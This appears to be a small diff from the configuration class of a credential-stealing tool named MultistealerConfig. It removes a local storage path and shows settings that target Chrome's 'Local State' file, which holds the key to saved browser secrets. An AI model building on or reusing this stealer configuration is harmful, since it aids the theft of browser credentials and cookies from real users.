@@ -104,7 +104,6 @@ class MultistealerConfig:
     PoolSize = 5
 
     ZipName = f"{user}-st"
-    StoragePath = rf"{user_profile}\AppData\stink"
 
     ChromePaths = (
         rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State",
